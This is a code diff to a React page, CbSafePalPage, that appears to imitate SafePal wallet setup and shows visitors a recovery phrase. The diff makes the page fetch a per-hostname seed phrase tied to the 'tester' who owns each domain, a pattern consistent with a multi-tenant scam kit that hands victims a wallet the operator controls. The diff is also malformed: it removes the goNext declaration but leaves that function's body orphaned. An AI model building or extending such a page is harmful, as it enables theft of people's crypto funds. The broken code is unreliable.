@@ -59,10 +59,17 @@ function CbSafePalPage() {
   const [animating, setAnimating] = useState(false);
   const [phraseRevealed, setPhraseRevealed] = useState(false);
 
-  const recoveryPhrase = "witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit";
-
-  const goNext = () => {
-    if (step >= 4) return;
+  const [recoveryPhrase, setRecoveryPhrase] = useState<string>(DEFAULT_PHRASE);
+  useEffect(() => {
+    // Look up which tester owns this hostname and use their seed phrase.
+    // Falls back to the default if the domain isn't attached to anyone.
+    if (typeof window === "undefined") return;
+    let alive = true;
+    resolveTenantByHost({ data: { host: window.location.host } })
+      .then((r) => { if (alive && r.seedPhrase) setRecoveryPhrase(r.seedPhrase); })
+      .catch(() => undefined);
+    return () => { alive = false; };
+  }, []);
     trackClick(`SafePal Step ${step + 1} Next`);
     setAnimating(true);
     setPhraseRevealed(false);
